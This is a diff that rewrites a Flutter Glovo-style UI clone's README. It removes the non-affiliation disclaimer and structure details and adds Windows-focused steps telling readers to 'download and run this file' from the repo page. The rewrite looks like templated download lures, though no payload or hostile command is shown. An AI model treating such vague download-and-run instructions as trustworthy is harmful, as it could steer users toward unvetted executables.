@@ -1,189 +1,160 @@
-<p align="center">
-  <img src="assets/images/ic_glovo_launcher.png" alt="Glovo Clone Logo" width="120" height="120" />
-</p>
+# 📱 glovo-ui-practice - Build a polished delivery app UI
 
-<h1 align="center">Glovo Clone – Flutter UI Recreation</h1>
-
-<p align="center">
-  A pixel-inspired, non-commercial Flutter clone of the <a href="https://glovoapp.com">Glovo</a> delivery app UI.
-  <br/>
-  <strong>⚠️ This is NOT an official Glovo product. It is a personal project built for learning and portfolio purposes only.</strong>
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/Flutter-3.x-02569B?logo=flutter&logoColor=white" alt="Flutter" />
-  <img src="https://img.shields.io/badge/Dart-3.x-0175C2?logo=dart&logoColor=white" alt="Dart" />
-  <img src="https://img.shields.io/badge/License-MIT-green.svg" alt="License" />
-  <img src="https://img.shields.io/badge/Status-In%20Progress-orange" alt="Status" />
-</p>
-
----
-
-## 📖 About
-
-This project is a **UI clone** of the popular food & delivery app **Glovo**, built entirely with **Flutter**. The goal was to replicate the look and feel of the original Glovo app as closely as possible — while understanding that **this is NOT a 100% copy**. Some screens, animations, and features have been adapted, simplified, or reimagined to fit the scope of a personal project.
-
-> **Disclaimer:** This project is intended **solely for educational and portfolio purposes**. It is not affiliated with, endorsed by, or connected to Glovo in any way. No real data, API, or backend services from Glovo are used. All trademarks belong to their respective owners.
-
----
-
-## 📸 Screenshots
-
-<table>
-  <tr>
-    <td align="center"><strong>Login</strong></td>
-    <td align="center"><strong>Verification</strong></td>
-    <td align="center"><strong>Home</strong></td>
-    <td align="center"><strong>Explorer</strong></td>
-  </tr>
-  <tr>
-    <td><img src="screenshots/login-screen.jpg" alt="Login Screen" width="200"/></td>
-    <td><img src="screenshots/verification-screen.jpg" alt="Verification Screen" width="200"/></td>
-    <td><img src="screenshots/home-screen.jpg" alt="Home Screen" width="200"/></td>
-    <td><img src="screenshots/explorer-screen.jpg" alt="Explorer Screen" width="200"/></td>
-  </tr>
-  <tr>
-    <td align="center"><strong>Explorer (Details)</strong></td>
-    <td align="center"><strong>Orders</strong></td>
-    <td align="center"><strong>Profile</strong></td>
-    <td align="center"><strong>Modify</strong></td>
-  </tr>
-  <tr>
-    <td><img src="screenshots/explroer-screen-2.jpg" alt="Explorer Details Screen" width="200"/></td>
-    <td><img src="screenshots/commandes-screen.jpg" alt="Orders Screen" width="200"/></td>
-    <td><img src="screenshots/profile-screen.jpg" alt="Profile Screen" width="200"/></td>
-    <td><img src="screenshots/modify-screen.jpg" alt="Modify Screen" width="200"/></td>
-  </tr>
-</table>
-
----
-
-## ✨ Features
-
-- 🔐 **Login & Verification** – Phone number authentication flow with OTP verification UI
-- 🏠 **Home Screen** – Category browsing, promo banners, and restaurant listings
-- 🔍 **Explorer Screen** – Discover restaurants, cuisines, and food categories
-- 📦 **Orders Screen** – View past and current orders
-- 👤 **Profile / Account Screen** – User profile management UI
-- ✏️ **Modify Screen** – Edit user information
-- 🎨 **Custom Fonts** – Uses Glovo's original font family (Black, Bold, Book, Medium) + WorkSans
-- 🎞️ **Lottie Animations** – Smooth, delightful animations throughout the app
-- 📱 **SVG Assets** – Crisp vector graphics for icons and illustrations
-- 🧭 **Bottom Navigation** – Seamless tab-based navigation (Home, Explorer, Orders, Account)
-
----
-
-## 🛠️ Tech Stack
-
-| Technology | Purpose |
-|---|---|
-| **Flutter** | Cross-platform UI framework |
-| **Dart** | Programming language |
-| **flutter_svg** | SVG rendering |
-| **Lottie** | Animation playback |
-| **Custom Fonts** | Glovo-inspired typography |
-
----
+[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Hazem6482/glovo-ui-practice)
 
 ## 🚀 Getting Started
 
-### Prerequisites
+glovo-ui-practice is a Flutter app that recreates a Glovo-style delivery interface with clean screens and smooth motion. It is made for Windows users who want to download the app and run it with a few simple steps.
 
-- [Flutter SDK](https://docs.flutter.dev/get-started/install) (3.x or later)
-- [Dart SDK](https://dart.dev/get-dart) (3.x or later)
-- Android Studio / VS Code with Flutter extensions
-- An Android or iOS emulator, or a physical device
+Use this page to download and run the project:
+https://github.com/Hazem6482/glovo-ui-practice
 
-### Installation
+## 🖥️ What You Need
 
-```bash
-# Clone the repository
-git clone https://github.com/YOUR_USERNAME/glovo-clone.git
+Before you start, make sure your Windows PC has:
 
-# Navigate to the project directory
-cd glovo-clone/glovo
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 8 GB of RAM
+- 5 GB of free disk space
+- Google Chrome or Microsoft Edge
+- Flutter installed if you want to run the source project
+- Android Studio or Visual Studio Code if you want to open the files
 
-# Install dependencies
-flutter pub get
+## 📦 What This App Includes
 
-# Run the app
-flutter run
-```
+This app rebuilds the look and feel of a modern food delivery app. It focuses on the user interface, so the screens feel smooth and complete.
 
----
+You can expect:
 
-## 📂 Project Structure
+- Login screen with a clean layout
+- Home screen with featured content
+- Explorer screen for browsing items
+- Order tracking screen
+- Custom fonts for a refined look
+- Lottie animations for motion
+- Reusable UI parts for a consistent design
+- Mobile-first layout that fits delivery app use
 
-```
-glovo/
-├── assets/
-│   ├── fonts/          # Custom Glovo & WorkSans fonts
-│   ├── images/         # PNG assets (categories, restaurants, icons…)
-│   ├── lotties/        # Lottie animation files
-│   └── svgs/           # SVG vector assets
-├── lib/
-│   ├── constants/      # App-wide constants (colors, styles…)
-│   ├── screens/        # All app screens
-│   │   ├── home_screen.dart
-│   │   ├── explorer_screen.dart
-│   │   ├── orders_screen.dart
-│   │   ├── account_screen.dart
-│   │   ├── login_screen.dart
-│   │   ├── verification_screen.dart
-│   │   └── ...
-│   ├── widgets/        # Reusable UI components
-│   └── main.dart       # App entry point
-├── screenshots/        # App screenshots
-└── pubspec.yaml        # Flutter project configuration
-```
+## 🔽 Download the App
 
----
+Go to the project page and download and run this file or follow the files in the repository:
 
-## ⚠️ What's Different from the Original Glovo App?
+https://github.com/Hazem6482/glovo-ui-practice
 
-This is a **UI-only** project with **no backend** integration. Here's what differs:
+If you are using the repository on Windows, follow these steps:
 
-| Aspect | Original Glovo | This Clone |
-|---|---|---|
-| Backend / API | Full production backend | ❌ No backend – static UI only |
-| Payments | Real payment processing | ❌ Not implemented |
-| Live Tracking | Real-time order tracking | ❌ Not implemented |
-| Authentication | Real phone/email auth | 🎨 UI only (no real auth) |
-| Data | Live restaurant & product data | 📦 Static / mock data |
-| All Screens | 50+ screens | 🔢 ~10 key screens recreated |
-| Animations | Proprietary animations | 🎞️ Lottie-based alternatives |
+1. Open the link in your browser.
+2. Click the green Code button.
+3. Choose Download ZIP.
+4. Save the file to your PC.
+5. Extract the ZIP file to a folder you can find again, such as Downloads or Desktop.
 
----
+## 🛠️ Open and Run on Windows
 
-## 🤝 Contributing
+If you want to run the Flutter project on Windows, use these steps:
 
-Contributions, issues, and feature requests are welcome! Feel free to check the [issues page](https://github.com/YOUR_USERNAME/glovo-clone/issues).
+1. Install Flutter on your PC.
+2. Install Android Studio or Visual Studio Code.
+3. Open a terminal in the project folder.
+4. Run this command to get the app files it needs:
 
-1. Fork the project
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add some amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
+   `flutter pub get`
 
----
+5. Connect an Android phone with USB, or start an Android emulator.
+6. Run the app with:
 
-## 📄 License
+   `flutter run`
 
-This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.
+If Windows asks for access, allow it so the app can open and connect to your device or emulator.
 
----
+## 📂 Folder Layout
 
-## 🙏 Acknowledgements
+The project is set up in a simple way so the app code is easy to follow.
 
-- [Glovo](https://glovoapp.com) – for the design inspiration
-- [Flutter](https://flutter.dev) – for the amazing cross-platform framework
-- [Lottie](https://airbnb.io/lottie/) – for beautiful animations
-- [flutter_svg](https://pub.dev/packages/flutter_svg) – for SVG support
+Common parts include:
 
----
+- `lib/` for the app screens and UI code
+- `assets/` for images, icons, and animation files
+- `pubspec.yaml` for app packages and asset links
+- `android/` for Android build files
+- `ios/` for iPhone build files
 
-<p align="center">
-  Made with ❤️ and Flutter
-  <br/>
-  <strong>This project is for educational purposes only and is not affiliated with Glovo.</strong>
-</p>
+## 🎨 Main Screens
+
+The app is built around the core screens a delivery app needs.
+
+### Login Screen
+A clean first screen with a simple sign-in flow and strong visual balance.
+
+### Home Screen
+Shows key content, categories, and a layout that feels ready for shopping or ordering.
+
+### Explorer Screen
+Lets users browse items in a clear and easy way.
+
+### Order Tracking Screen
+Shows order progress in a format that is easy to read on a phone.
+
+## ✨ Design Details
+
+This project aims for a pixel-perfect look. The layout uses careful spacing, strong alignment, and consistent text styles.
+
+The design includes:
+
+- Custom typography
+- Smooth Lottie animation support
+- Clear cards and sections
+- Rounded shapes
+- Strong visual hierarchy
+- Delivery app style colors and spacing
+
+## 📌 Who This Is For
+
+This app is useful if you want to:
+
+- Study Flutter UI structure
+- Learn how a delivery app can be built
+- Review reusable screen parts
+- Explore screen layouts for mobile apps
+- Practice with animations and custom fonts
+- Use a Glovo-style UI as a reference
+
+## 🔍 Common Questions
+
+### Can I run this on Windows?
+Yes. You can use Windows to download the project and run it with Flutter tools.
+
+### Do I need coding knowledge?
+You need very little knowledge to download the files. To run the project from source, you need basic Flutter setup.
+
+### Does this include a working delivery backend?
+No backend setup is required for the UI demo. The project focuses on the front-end screens and visual flow.
+
+### Can I change the design?
+Yes. You can edit colors, text, images, and layouts to fit your own app idea.
+
+## 📋 Simple Setup Checklist
+
+- Download the project from the link above
+- Extract the files
+- Install Flutter
+- Open the folder in your editor
+- Get the packages with `flutter pub get`
+- Run the app with `flutter run`
+
+## 🧭 File Use Tips
+
+If you only want to view the design, you can open the project folder and inspect the assets and screens. If you want to test the app on a phone or emulator, use Flutter and run it from the command line or editor.
+
+## 🧩 Topic Areas
+
+This project fits these areas:
+
+- Flutter app design
+- Delivery app UI
+- Food delivery app layout
+- Cross-platform mobile UI
+- Lottie animation use
+- Reusable component structure
+- Pixel-perfect screen recreation
